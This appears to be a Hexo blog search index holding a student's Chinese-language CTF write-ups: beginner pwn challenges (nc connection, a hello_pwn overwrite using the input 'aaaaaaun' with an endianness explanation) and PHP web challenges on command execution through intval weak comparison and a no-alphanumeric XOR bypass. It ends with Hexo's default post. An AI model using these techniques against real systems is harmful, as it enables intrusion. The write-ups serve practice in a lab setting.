href="https://blog.csdn.net/weixin_61835841/article/details/124279058?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167383943616800217016672%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167383943616800217016672&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-124279058-null-null.142%5Ev71%5Eone_line,201%5Ev4%5Eadd_ask&utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6&spm=1018.2226.3001.4187">大佬</a>，我一个萌新就不再赘余了</p><p>php备份文件：后缀为php~或者index.php.bak</p><p>php的源代码文件：后缀为phps</p><p>这里的PHP代码&#x3D;&#x3D;还是弱相等</p><p>urlencode()函数原理就是首先把中文字符转换为十六进制，然后在每个字符前面加一个标识符%。 urldecode()函数与urlencode()函数原理相反，用于解码已编码的 URL 字符串，其原理就是把十六进制字符串转换为中文字符，参考这位大佬<a href="https://blog.csdn.net/weixin_34106122/article/details/92415892?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165036049816780261978644%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165036049816780261978644&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-92415892.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=urldecode&spm=1018.2226.3001.4187">博客</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn第一周</title>
    <link href="/2023/01/14/%E5%AF%92%E5%81%87pwn%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
    <url>/2023/01/14/%E5%AF%92%E5%81%87pwn%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<p>怎么说，对pwn我完全是个小白啥都不懂，目前是先看着wp做的，知识学习慢慢学吧</p><h1 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a>1.test_your_nc</h1><p>这是buuctf上的入门题，Linux中nc命令使用</p><p>根据题目提示测试我们的nc，格式为 nc 服务器端口，连接靶场，执行ls命令发现flag文件用cat flag进行查看得到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image.png"></p><h1 id="2-get-shell"><a href="#2-get-shell" class="headerlink" title="2.get_shell"></a>2.get_shell</h1><p>这是攻防世界里的入门题</p><p>nc连接，ls命令查看发现flag文件，然后cat flag得到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(2).png"></p><h1 id="3-hello-pwn"><a href="#3-hello-pwn" class="headerlink" title="3.hello_pwn"></a>3.hello_pwn</h1><p>1.nc连接，ida打开文件f5反汇编后分析代码，</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(3).png"></p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(4).png"></p><p>先分析，当dword_60106c&#x3D;&#x3D;1853186401即可执行sub_400686函数，点击看到这个函数执行是得到flag文本的命令执行，初步判断这样就得到了flag</p><p>先看read函数</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">函数原型： <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-type">int</span> handle,<span class="hljs-type">void</span> *buf,<span class="hljs-type">int</span> len)</span></span>;<br>功能：用于读取打开文件的内容<br>参数：<span class="hljs-type">int</span> handle 为要读取的文件<br>          <span class="hljs-type">void</span> *buf  为要将读取的内容保存的缓冲区<br>          <span class="hljs-type">int</span> len    读取文件的长度<br>          返回值：返回实际读取的字节数<br></code></pre></td></tr></table></figure><p>就是说当读取到unk_601068处，读取长度就是0x10uLL，(0x开头是10进制</p><p>ULL后缀是使成为unsigned long long ,前缀使成为十六进制文字)</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674100344280-ed9dbd21-3fed-45f8-a6be-4f49f5037b01.png" alt="img"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">db</span>定义字节类型变量，一个字节数据占<span class="hljs-number">1</span>个字节单元，读完一个，偏移量加<span class="hljs-number">1</span><br><br><span class="hljs-attribute">dw</span>定义字类型变量，一个字数据占<span class="hljs-number">2</span>个字节单元，读完一个，偏移量加<span class="hljs-number">2</span><br><br><span class="hljs-attribute">dd</span>定义双字类型变量，一个双字数据占<span class="hljs-number">4</span>个字节单元，读完一个，偏移量加<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="/./../imgs/$%7Bfiilename%7D/copycode.gif" alt="复制代码"></a></p><p>发现目标dword_60106c就在写入位置下面4个位置，那么写内容填入到目标位置就可以了，db是一个字节我们要写填好4给db，那就输入四个字节内容：aaaa（什么都可以）</p><p>unsigned long long是8个字节</p><p>所以目标位置他是dd，是双字类型，占据4个字节。我们要让这4个字节等于1853186401，我们要是直接输入1853186401，会发现这其实占了10个字节，因此我们要想一个字节和数字转换的方式。</p><p>我们先把10进制转16进制</p><p>1853186401-&gt;6e756161</p><p>16进制转字符串</p><p>6e756161-&gt;nuaa</p><p>发现转换后正好是目标位置的双字类型，4个字节。</p><p>但是组合输入aaaanuaa发现没有flag，这个原因是因为大小端序</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">大端就是：存储最高有效字节在最小的地址（网络传输文件存储常用）。<br>小端就是：存储最低有效字节在最小的地址（计算机内部存储）。<br></code></pre></td></tr></table></figure><p>大小端序就是字节顺序相反，因为我们覆盖存储，所有这里采用小端序</p><p>输入aaaaaaun后满足代码获取flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(5).png"></p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(6).png"></p><p>这个我是看了一篇大神的<a href="https://www.cnblogs.com/aninock/p/15491818.html">wp</a>分析，好多知识都没接触过</p>]]></content>
    
    
    <categories>
      
      <category>test_your_nc</category>
      
      <category>get_shell</category>
      
      <category>hello_pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nc命令</tag>
      
      <tag>ida</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>寒假web第一周</title>
    <link href="/2023/01/14/%E5%AF%92%E5%81%87web%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
    <url>/2023/01/14/%E5%AF%92%E5%81%87web%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-rce-1"><a href="#1-rce-1" class="headerlink" title="1.rce 1"></a>1.rce 1</h1><p><img src="/./../imgs/$%7Bfiilename%7D/Image1-1673688779485-1.jpg"></p><p>1.代码审计题，第一个if条件首先intval函数弱比较用get方式传入int&#x3D;1000abc</p><p>2.第二个if条件用post传入target进行命令执行</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image2-1673689031250-3.jpg"></p><p>3.查看目录里有ffffllllaaaagggg文件用cat读取的得到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image3.jpg"></p><p>4.函数知识</p><p>（isset函数函数用于检测变量是否已设置并且非 NULL。</p><p>intval函数弱比较，附上一个知识链接</p><p><a href="https://blog.csdn.net/Reme_mber/article/details/124781330?ops_request_misc=%7B%22request_id%22:%22167359150716800186533228%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167359150716800186533228&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-124781330-null-null.142">https://blog.csdn.net/Reme_mber/article/details/124781330?ops_request_misc=%7B%22request%5Fid%22%3A%22167359150716800186533228%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167359150716800186533228&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-124781330-null-null.142</a></p><p>）</p><h1 id="2-rce-2"><a href="#2-rce-2" class="headerlink" title="2.rce 2"></a>2.rce 2</h1><p><img src="/./../imgs/$%7Bfiilename%7D/Image4.jpg"></p><p>1.代码审计发现是无字母数字的绕过，利用异或方法构造payload（这里的构造我目前不太理解，参看的百度一篇文章<a href="https://www.yisu.com/zixun/498376.html">https://www.yisu.com/zixun/498376.html</a> ）</p><p> 先进行phpinfo测试，</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image5.jpg"></p><p>2.成功后采用命令执行然后发现index.php，</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image6.jpg"></p><p>3.访问目录未发现，进行上级查询直至发现ffffllllaaaagggg文件，<img src="/./../imgs/$%7Bfiilename%7D/Image7-1673701043014-1.jpg"></p><p>cat读取得到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image8.png"></p><p>4.函数知识</p><p>（preg_match（）简单说是查找， 它的值将是 0 次（不匹配）或 1 次，这里附上一个具体知识</p><p><a href="https://www.runoob.com/php/php-preg_match.html">https://www.runoob.com/php/php-preg_match.html</a></p><p>highlight_file用来输出文件内容</p><p>die() 函数输出一条消息，并退出当前脚本。</p><p>intval函数弱相等eval() 函数十分强大 —— 将字符串当成 有效的表达式来求值 并 返回计算结果作用：eval() 函数会把字符串的引号去掉，然后把中间的内容当作python的代码，然后eval() 函数会执行这一段代码，并且返回执行的结果。）</p>]]></content>
    
    
    <categories>
      
      <category>rce 1</category>
      
      <category>rce 2</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
      <tag>无数字字母绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/01/10/hello-world/"/>
    <url>/2023/01/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
